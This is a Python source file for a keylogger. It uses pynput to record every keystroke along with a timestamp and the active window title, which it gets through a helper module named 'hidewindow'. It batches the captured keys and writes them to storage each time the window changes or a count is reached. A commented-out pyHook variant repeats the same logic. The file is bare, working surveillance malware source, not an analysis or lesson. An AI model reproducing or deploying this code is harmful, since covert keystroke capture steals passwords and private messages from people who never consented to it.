import data
import session
import pynput.keyboard as keyb
from hidewindow import Title as t


class StartKeyLog:
    winname = data.Initialize.winName
    keylst = data.Initialize.keyLst
    keycount = data.Initialize.keycount

    def press(self, key):
        try:
            self.keycount += 1
            window = t()
            keyent = {'time': data.Date.time, 'window': window.title(), 'key': key.char}
            if not self.winname:
                self.winname = window.title()
            if self.winname != window.title() or self.keycount >= data.Initialize.wrt:
                # writeSession(keyLst)
                store = session.Write()
                store.store(lst=self.keylst)
                self.keycount = 0
                self.keylst = []
                self.winname = window.title()
            self.keylst.append(keyent)
        except AttributeError:
            self.keycount += 1
            window = t()
            keyent = {'time': data.Date.time, 'window': window.title(), 'key': key}
            if not self.winname:
                self.winname = window.title()
            if self.winname != window.title() or self.keycount >= data.Initialize.wrt:
                # writeSession(keyLst)
                store = session.Write()
                store.store(lst=self.keylst)
                self.keycount = 0
                self.keylst = []
                self.winname = window.title()
            self.keylst.append(keyent)

    # def on_keyboard_event(self, event):
    #     self.keycount += 1
    #     keyent = {'time': data.Date.time, 'window': event.WindowName, 'key': event.Key}
    #     if not self.winname:
    #         self.winname = event.WindowName
    #     if self.winname != event.WindowName or self.keycount >= data.Initialize.wrt:
    #         # writeSession(keyLst)
    #         store = session.Write()
    #         store.store(lst=self.keylst)
    #         self.keycount = 0
    #         self.keylst = []
    #         self.winname = event.WindowName
    #     self.keylst.append(keyent)
    #     return True

    def start(self):
        # hook = pyHook.HookManager()
        # hook.KeyDown = self.on_keyboard_event
        # hook.HookKeyboard()
        # pythoncom.PumpMessages()
        keyblistener = keyb.Listener(on_press=self.press)
        with keyblistener:
            keyblistener.join()


class StopKeyLog:
    def stop(self):
        keyb.Listener.stop()
